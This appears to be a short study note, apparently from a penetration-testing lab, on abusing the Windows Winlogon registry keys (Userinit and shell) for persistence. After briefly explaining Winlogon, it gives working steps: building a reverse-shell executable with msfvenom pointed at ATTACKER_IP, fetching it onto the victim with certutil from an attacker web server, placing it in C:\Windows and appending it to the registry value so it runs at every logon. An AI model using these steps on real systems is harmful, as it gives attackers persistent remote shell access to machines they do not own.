#### What is `Winlogon`?
The Windows component that is responsible for ***handling the secure attention sequence***, ***loading your user profile right after authentication***, ***creates the desktop for the window station***, and optionally ***locking the computer when a screensaver is running***.

Winlogon uses some registry keys under: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`
- `Userinit:` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
- `shell:` points to the system's shell, which is usually `explorer.exe`.
![[Winlogon.png]]

**If we'd replace any of the executables with reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands seperated by a comma, and Winlogon will process them all..**

#### Create a Reverse shell
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
```

#### Transfer the Shell
```bash
python3 -m http.server
```

```cmd
certutil -urlcache -split -f http://<attacker_ip>:8000/revshell.exe
```

**Move the shell in Windows directory**
```cmd
move revshell.exe C:\Windows
```

Now, alter either `shell` or `userinit` in registry.

**Sign out of your current session and log in again.**
